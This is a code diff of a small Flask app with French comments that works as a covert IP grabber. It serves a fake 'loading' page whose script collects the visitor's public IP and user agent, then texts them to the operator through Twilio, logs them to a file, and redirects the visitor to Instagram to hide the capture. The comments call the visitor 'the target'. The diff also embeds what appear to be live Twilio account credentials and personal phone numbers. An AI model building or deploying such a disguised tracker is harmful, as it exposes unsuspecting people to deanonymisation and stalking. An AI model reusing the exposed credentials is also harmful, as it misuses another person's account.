@@ -3,17 +3,13 @@ from twilio.rest import Client
 
 app = Flask(__name__)
 
-# Remplace par tes informations Twilio
+# === Infos Twilio ===
 account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
 auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
-from_number = '+12524866318'
-to_number = '+33635960569'
+from_phone_number = '+12524866318'
+to_phone_number = '+33635960569'
 
 client = Client(account_sid, auth_token)
-
-# Numéro Twilio et destinataire
-from_phone_number = '+12524866318'  # Ton numéro Twilio
-to_phone_number = '+33635960569'  # Le numéro de téléphone où tu veux recevoir les SMS (remplace par ton propre numéro)
 
 def send_sms(ip_address, user_agent):
     body = f"IP Address: {ip_address}\nUser Agent: {user_agent}"
@@ -27,24 +23,54 @@ def send_sms(ip_address, user_agent):
     except Exception as e:
         print(f"Error sending SMS: {e}")
 
-def log_to_file(ip_address, user_agent):
-    # Enregistrer l'IP et l'User-Agent dans un fichier log.txt
-    with open('log.txt', 'a') as log_file:
-        log_file.write(f"IP: {ip_address}, User-Agent: {user_agent}\n")
-
+# === Route principale (HTML + JavaScript) ===
 @app.route('/')
 def index():
-    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)  # Récupère l'IP publique réelle
-    user_agent = request.headers.get('User-Agent')  # Récupère le User-Agent de la cible
-    
-    # Log dans le fichier
-    log_to_file(ip_address, user_agent)
+    return '''
+    <html>
+    <head><title>Chargement...</title></head>
+    <body>
+        <script>
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    fetch('/log_ip', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            ip: data.ip,
+                            user_agent: navigator.userAgent
+                        })
+                    }).then(() => {
+                        // Redirection après envoi
+                        window.location.href = 'https://www.instagram.com';
+                    });
+                });
+        </script>
+    </body>
+    </html>
+    '''
 
-    # Envoie un SMS avec l'IP et User-Agent
-    send_sms(ip_address, user_agent)
+# === Route pour recevoir l'IP publique ===
+@app.route('/log_ip', methods=['POST'])
+def log_ip():
+    data = request.get_json()
+    ip = data.get('ip')
+    user_agent = data.get('user_agent')
 
-    # Redirige vers une image ou une page (exemple ici avec une image)
-    return redirect("https://www.instagram.com")  # Remplace par ton URL d'image
+    print(f"[JS] IP publique: {ip}, User-Agent: {user_agent}")
 
+    # Envoie le SMS
+    send_sms(ip, user_agent)
+
+    # Enregistrement dans le fichier log.txt
+    with open("log.txt", "a") as f:
+        f.write(f"IP: {ip} - User-Agent: {user_agent}\n")
+
+    return '', 200
+
+# === Lancer l'app ===
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
